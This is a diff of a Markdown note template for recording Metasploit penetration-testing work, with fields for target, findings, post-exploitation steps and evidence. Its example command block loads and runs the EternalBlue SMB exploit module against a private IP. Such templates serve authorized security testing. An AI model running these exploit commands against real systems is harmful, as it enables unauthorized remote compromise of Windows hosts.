@@ -1,56 +1,49 @@
-# 🛠️ Metasploit Note
-
-**Date:**  
-**Campaign / Target:**  
-**Author:**  
-
+---
+title: "<% tp.file.title %>"
+type: tool-note
+tool: Metasploit
+created: "<% tp.date.now('YYYY-MM-DD') %>"
+tags: [tool, metasploit, exploit]
+cssclass: cs-note
 ---
 
-## 🎯 Objective
-(What am I trying to accomplish with Metasploit — exploit, post-exploit, module test?)
+# <% tp.file.title %>
 
----
+> [!meta]
+> Campaign/Target:  • Date: <% tp.date.now('YYYY-MM-DD') %>
 
-## 🔍 Target Info
-- IP / Hostname:  
-- Port(s):  
-- Service / Version:  
-- OS / Notes:  
+## Objective
+Exploit validation, post-exploitation, or module testing.
 
----
+## Target Info
+- Host:  
+- Ports:  
+- Service/Version:  
+- OS:  
 
-## ⚙️ Modules / Commands
-    # Example usage
-    msfconsole
-    use exploit/windows/smb/ms17_010_eternalblue
-    set RHOSTS 10.0.0.5
-    set LHOST 10.0.0.10
-    run
+## Modules / Commands
+```text
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.0.0.5
+set LHOST 10.0.0.10
+run
+```
 
----
+## Output / Findings
+Paste console output and results.
 
-## 🧾 Output / Findings
-(Quick paste of console output, meterpreter notes, successful/failed attempts)
+## Post-Exploitation Notes
+- Privilege escalation:  
+- Persistence:  
+- Data exfiltration:  
 
----
+## Artifacts / Evidence
+`/Evidence/metasploit/` — files/screenshots/logs
 
-## 🔐 Post-Exploitation Notes
-- Privilege escalation attempts:  
-- Persistence tests:  
-- Data exfiltration notes:  
+## Next Steps
+- 
 
----
+## References
+metasploit-framework docs, exploit-db
 
-## 🧩 Artifacts / Evidence
-`/Evidence/metasploit/` — list files/screenshots/logs
-
----
-
-## 🧭 Next Steps
--  
--  
-
----
-
-**References:**  
-(MSF module docs, exploit-db, metasploit-framework docs)
